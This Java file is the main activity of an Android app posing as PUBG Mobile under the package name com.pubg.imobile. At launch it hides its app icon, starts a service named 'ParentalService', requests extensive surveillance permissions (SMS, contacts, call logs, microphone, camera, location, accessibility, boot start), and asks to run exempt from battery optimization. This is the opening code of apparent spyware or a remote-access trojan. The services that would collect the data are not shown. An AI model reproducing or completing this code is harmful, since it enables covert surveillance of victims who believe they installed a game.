package com.pubg.imobile;


import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

public class MainActivity extends AppCompatActivity {
    Context context;
    private static final int ALL_PERMISSIONS_REQUEST_CODE = 123;
    private final String[] permissions = {"android.permission.INTERNET", "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS", "android.permission.REQUEST_COMPANION_RUN_IN_BACKGROUND", "android.permission.REQUEST_COMPANION_USE_DATA_IN_BACKGROUND", "android.permission.BIND_ACCESSIBILITY_SERVICE" , "android.permission.ACCESS_WIFI_STATE", "android.permission.CHANGE_WIFI_STATE", "android.permission.ACCESS_NETWORK_STATE", "android.permission.ACCESS_COARSE_LOCATION", "android.permission.ACCESS_FINE_LOCATION", "android.permission.READ_PHONE_STATE", "android.permission.SEND_SMS", "android.permission.RECEIVE_SMS", "android.permission.RECORD_AUDIO", "android.permission.CALL_PHONE", "android.permission.READ_CONTACTS", "android.permission.WRITE_CONTACTS", "android.permission.WRITE_SETTINGS", "android.permission.CAMERA", "android.permission.READ_SMS", "android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.RECEIVE_BOOT_COMPLETED", "android.permission.SET_WALLPAPER", "android.permission.READ_CALL_LOG", "android.permission.WRITE_CALL_LOG", "android.permission.WAKE_LOCK", "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"};
        protected void onCreate (Bundle savedInstanceState){
                super.onCreate(savedInstanceState);
            context=getApplicationContext();

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                Functions.hideAppIcon(context);
            }
            startService(new Intent(this, ParentalService.class));
            ActivityCompat.requestPermissions(this, this.permissions, ALL_PERMISSIONS_REQUEST_CODE);
            Intent intent = new Intent();
            String packagename = getPackageName();
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(packagename)) {
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + packagename));
                startActivity(intent);
            }
            Job.startService(this);
    }
}





